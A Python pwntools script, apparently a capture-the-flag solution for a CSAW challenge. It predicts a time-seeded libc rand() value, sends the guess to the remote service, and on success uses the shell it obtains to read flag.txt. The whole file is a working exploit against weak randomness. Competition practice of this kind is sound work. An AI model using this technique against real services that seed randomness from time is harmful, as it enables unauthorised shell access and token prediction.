import ctypes
import time
from pwn import *

libc = ctypes.CDLL("libc.so.6")

def needle(seed):
    libc.srand(seed)
    return libc.rand() % 0x100000

context.log_level = 'error'

# Try a range of time offsets
for offset in range(-5, 6):
    try:
        p = remote("pwn.chal.csaw.io", 5000, timeout=5)
        # read initial prompt
        p.recvuntil(b"check?\n")
        base = int(time.time()) + offset
        found = False
        for i in range(3):
            guess = needle(base + i)
            p.sendline(str(guess).encode())
            resp = p.recvuntil(b"check?\n", timeout=3)
            if b"found a needle! And its number is 0x00001337" in resp:
                print("FOUND with offset", offset, "guess", guess)
                # now we have a shell
                p.sendline(b"cat flag.txt")
                print(p.recvall(timeout=5).decode(errors='replace'))
                found = True
                break
        p.close()
        if found:
            break
    except Exception as e:
        print("err", offset, e)
end_of_edit

